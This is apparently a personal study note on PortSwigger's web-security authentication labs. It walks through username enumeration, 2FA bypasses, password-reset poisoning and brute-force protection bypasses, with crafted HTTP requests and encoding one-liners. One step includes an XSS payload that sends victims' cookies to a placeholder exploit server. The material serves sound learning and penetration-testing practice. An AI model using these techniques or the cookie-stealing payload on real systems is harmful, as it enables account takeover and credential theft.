# AUTHENTICATION 
#### [RESOURCE]( https://portswigger.net/web-security/authentication)


## What is authentication?
Authentication is the process of verifying the identity of a given user or client. In other words, it involves making sure that they really are who they claim to be. 

- Something you know, such as a password or the answer to a security question. These are sometimes referred to as "knowledge factors".

- Something you have, that is, a physical object like a mobile phone or security token. These are sometimes referred to as "possession factors".

- Something you are or do, for example, your biometrics or patterns of behavior. These are sometimes referred to as "inherence factors".


## Difference between `Authentication` and 	`Authorization`?
`Authentication` is the process of verifying that a user really is who they claim to be, 
whereas `Authorization` involves verifying whether a user is allowed to do something.

--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

### PRACTICAL ATTACK SCENARIO
Make two accounts on Application 
 -  1- Hacker
- 2- Victim
 
### 1) Username enumeration via different responses - 
   1) Enumerate the correct username by brute-forcing
   2) Enumerate the correct password by brute-forcing
   3) Log in using correct credentials
---   
 
### 2) 2FA simple bypass - 
1) Change the URL to `/dashboard`
  - eg. Replace `https://target.com/?login2fa=victim` --->> `https://target.com/dashboard.html`
---
### 3) Password reset broken logic -
   1) Change the password from attackers account
   2) Now, Intercept the request and change the name/email/user-id etc. parameter to victim's name.
   3) If it is not working , then try to change request methods, remove the password-reset-token ..etc.
---
### 4) Username enumeration via little different responses -
   1) Check application has rate-limit on login page or not ? , if NO.....then
   2) Brute force the usernames, if all give `200` with approx same length , then
   3) Try to compare every bruteforce response via `intruder/options/grep-extract` in burp
   4) One of the response has slightly different response with different length
   5) If You have valid username, try to do same thing with passwords
   6) Now once you have valid username/password, Bang..!!
---
### 5) Username enumeration via response timing - 
   1) Check weather you're blocked or not ?
   2) If you're blocked try to send request with  `X-Forwarded-For` HTTP header.
   3) Now if you're not blocked or have different response or response timing, then ..
   4) By using of `pitchfork` attack in burp, Set the value of `X-Forwarded-For` to numbers around 1-100
   5) Set the `$username$` to your respective list of usernames
   6) After complete the attack see the change in response completed and response timing in burp Intruder
   7) If you see the change, then bruteforce that username with a password with same technique.
---
### 6) Broken brute-force protection, IP block - ###
   1) Check how many incorrect credentials attempts lead to IP block ?
   2) Consider the application blocks in every 3 incorrect attempts
   3) So, make a `username:password` wordlist so that everytime we brute-force correct credential, application will reset the counter for the number of failed login attempts by logging in to your own account before this limit is reached.
      
     `Username            Password
       Hacker              Hacker
       Victim              12345678
       Hacker              Hacker
       Victim              password123
       Hacker              Hacker
       Victim              Victim@123`

   4) So, When Victim collide/match with correct password, it gives different response without getting IP block.
---
### 7) Username enumeration via account lock - 
   1) Consider you don't know both username and password of victim, and the application locks the account on multiple incorrect attempts.
   2) Now for knowing username we have to bruteforce it by using `cluster-bomb` attack.
   3) To do it we have to mark an `username_wordlist.txt` in `username parameter` in login request and at the end of the request mark NULL(null payloads in burp)

    eg.
        `POST /login HTTP/1.1
         Host: www.target.com
         Cookie: session=5D1S1XdkAUnUB58Z8JpLTG4CpFlSjT61
         Content-Length: 29
         Origin: https://target.com/
         Referer: https://target.com/login
         Connection: close
         ...
         username='victim_name'&password=george'NULL'`

   4) By doing this,it might be possible that we get different response or length Once we have valid username 
   5) We can go through password parameter in `/login` request, by grep-extract(in burp intruder options) we can analyse different response/errors,  like we may `200 OK` with no errors or `200 OK` with different errors etc.

---

### 8) 2FA broken logic if application verify users - 
   1) By using of attacker's account generate 2FA code and complete the process respectively
   2) Now repeat the same process this time change the `verify=` parameter from `attacker` to `victim` like this ..
   
          `POST /login2 HTTP/1.1
           Host: target.com
           Cookie: verify='Victim'; session=nUIBGysR59pCd88nvVHKhi5bFOCv5Xug
           Referer: target.com/login_2fa
           Connection: close
           ...
           mfa-code=111111`
   
   3) Now if response is `302` then, send the 2fa request to Intruder & bruteforce accordingly, if right it gives `302 FOUND`.
   ---

### 9) Brute-forcing a stay-logged-in cookie -

  1) If the application uses any kind of encoded `key/token` in cookie or `stay-logged-in` cookie, we must look for it.
  2) Try to decode that `key/token` , mostly it is `base64` or `MD5`, if the decoded text is `email,username,password`
  3) Replace it with victim  `email,username,password` and encode it back in same as type.
  4) If you get email,username then simple replace it with victim's email,username
  5) But if you get password in decoded text, then bruteforce the cookie with multiple encoded passwords.

  #### For this lab...

  - Logged in via `wiener:peter` and navigate to `/myaccount` , observe the request, get a `stay-logged-in` cookie
   
  - Decode that `token/key` :
  
      `echo "d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw" | base64 -d` 

  - We get the decoded part like this `wiener:51dc30ddc473d43a6011e9ebba6ca770`, we can see that the encoded part after `wiener:` is MD5, so after decoding `51dc30ddc473d43a6011e9ebba6ca770`, we get password as `peter`. 
  
  - We can see that the application uses combination of base64 encoded `username:password(md5)` in `stay-logged-in` cookie.

  - We can easily replace the username with `victim's username` and bruteforce the `password` as `MD5`   
  
  - To Encode password into md5, we can use this oneliner : 
  
      `while read -r line; do echo -n "$line" | md5sum; done < passwords.txt > hashed_words.txt`

      - the sample output from `hashed_words.txt` is : `5c7686c0284e0875b26de99c1008e998`
  
  - In the above part, In `passwords.txt` it encode each password line by line into MD5.
  - To add the victim username before encoded password, we use this command

      `sed -i 's/^/carlos:/' hashed_words.txt`

      - sample output look like this : `carlos:e807f1fcf82d132f9bb018ca6738a19f` 

  - Now we have to encode the whole combination as `base64` and bruteforce it.    

      sample output of `base64` encoded combination of `username:password(md5)`

      `Y2FybG9zOmU4MDdmMWZjZjgyZDEzMmY5YmIwMThjYTY3MzhhMTlm`
---
### 10) Offline password cracking - ###   
  
  1) check all possibility for `xss` , if you get xss, try to steal user cookie with it.

  #### For this lab...
  
  - Log-in via `wiener:peter` and naviagte to any blog-post, put the malicious `xss` code into `comment` section.

     `<script>var i=new Image(); i.src="https://your-exploit-server/?cookie="+btoa(document.cookie);</script>` 
  
  - Now, Go to the `exploit server` and see the logs. You'll get the cookie of victim(carlos).

     `c2VjcmV0PW5icG10ME5Za3E4M0J6WlZFM0Y1UElpa3FtdXVOS3pzOyBzdGF5LWxvZ2dlZC1pbj1ZMkZ5Ykc5ek9qSTJNekl6WXpFMlpEVm1OR1JoWW1abU0ySmlNVE0yWmpJME5qQmhPVFF6`

  - Decode the above base64 encoded part into text. i..e

    `secret=nbpmt0NYkq83BzZVE3F5PIikqmuuNKzs; stay-logged-in=Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz`

  - Decode the base64 encoded `stay-logged-in` cookie into text.
  
    `carlos:26323c16d5f4dabff3bb136f2460a943`

  - At the decode the md5 hash of password, login to victim's account and delete the account.    
---
### 11) Password reset poisoning via middleware -

   1) If the application accepts `X-Forwarded-Host:` header, we can use it to manipulate the uniquely generated password reset link to any arbitrary domain.
   
   2) Log-in to attacker account, do forget password and intercept the requet
   
   3) Add, `X-Forwarded-Host:` header into the requet to you `burp-collaborator` url
   
   4) Now, navigate to your password reset link, if the link redirect you to `burp-collaborator` url, then the application is vulnerable to `Password-reset poisoning` attack.

   #### For this lab...

   - Go to the `/forget-password` page, enter the victim's username & intercept the request.
   - Now, add HTTP header `X-Forwarded-Host: your-exploit-server` in the request below the  `Host`
   - Forward the request, navigate to attacker `exploit-server`, we get a `HTTP-request` with unique `password-reset-token`
   - Add the `token` at the end of the url

      `https://lab-id.web-security-academy.net/forgot-password?temp-forgot-password-token=PASSWORD-RESET-TOKEN`

--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
### 12) Password brute-force via password change -

   1) If the application has password change functionality we can test it for bruteforce the correct password for victim. 
   2) Generally the application offers password change in which we have to put `Current_password` and `New-password`(twice).
       
          `Current-Password     : 
           New-Password         :
           Confirm New-Password :`

    3) In this case application verify the user either by any kind of `id`(userid,uid,id,etc..) or just  `username` & `email`, consider the request look like this...
    
           `POST /my-account/change-password HTTP/2
           Host: subdomain.target.com
           Cookie: session=1q4Qp3pu45octvgDcriUvwFkakxKs1xx
           Content-Length: 92
           ...
           ...
           username=victim_name&current-password=§password§&new-password-1=test@123&new-password-2=test@123`

    4) In the above case, application verify user by `username`, so we can easily change the value of `username` parameter to Victim's username and bruteforce the value of `current-password` 

    5) when the right value of `current-password` parameter is found, then the password of victim will automatically change to `test@123`

#### For this lab...

   - Login via `wiener:peter` , navigate to `/my-account`
   - Change the password and intercept the request
   - change the value of `username` parameter to victim's(carlos) username and mark the value of `current-password` parameter
   - Brute-force the value of `current-password` with the given list.
   - When the right `username:password` match found the password for victim(carlos) account will automatically change.
   - Logged into Victim's account with the new password.

---

### 13) Broken brute-force protection, multiple credentials per request -

   1) If the application has set the rate-limit on `/login` page, where we can not able to bruteforce.
   2) In that case we can put multiple credentials in a single request.

   - for eg. the `/login` request goes like this...

         `POST /login HTTP/2
         Host: subdomain.target.com
         Cookie: session=Mz6UOlrW9EEiXBKa0rTbnfHdOHodZtSu
         Content-Length: 43
         ...
         ...
         {
          "username":"test",
          "password":"test123"
         }`

    - Now, Instead of brute-forcing password parameter, we put multiple password in one request.
     - and the request look like this..

           `POST /login HTTP/2
           Host: subdomain.target.com
           Cookie: session=Mz6UOlrW9EEiXBKa0rTbnfHdOHodZtSu
           Content-Length: 1581
           ...
           ...
           {
             "username":"carlos",
             "password":["123456",
               "password",
               "12345678",
               "qwerty",
               "123456789",
               "12345",
               "1234",
               "111111"
              ]
           }`

#### For this lab...
    
   - Go to login page and login with `test:test`, intercept the request
    - Now replace the value of `username` to victim's(carlos) username and
    - Replace the value of `password` to list of passwords, forward the request & get `302`, it look something like this...

          `{
          "username":"carlos",
          "password":[ "123456",
           "password",
           "12345678",
           ...
           ...
           ]
          }`

---

### 14) 2FA bypass using a brute-force attack -

1) There are multiple ways to bypass 2FA, but this is the case when application logged-out after multiple wrong attempts

2) To bypass this we use `Burp's session handling features` to log back in automatically before sending each request.

   - In Burp, go to `Project options > Sessions`. In the `Session Handling Rules panel`, click `Add`. The Session handling rule editor dialog opens.

   - In the dialog, go to the `Scope` tab. Under `URL Scope`, select the option Include `all URLs`.
Go back to the Details tab and under `Rule Actions`, click `Add > Run a macro.`

   - Under `Select macro` click `Add` to open the Macro Recorder. Select the following 3 requests:
      
         `GET /login
          POST /login
          GET /2fa`

Then click OK. The Macro Editor dialog opens.
   
   - Click `Test macro` and check that the final response contains the page asking you to provide the 4-digit security code. This confirms that the macro is working correctly.

   - Now close the various dialogs until you get back to the main Burp window. 

3) The macro will now automatically logged you back as victim before each request is sent by Burp Intruder.

---
---
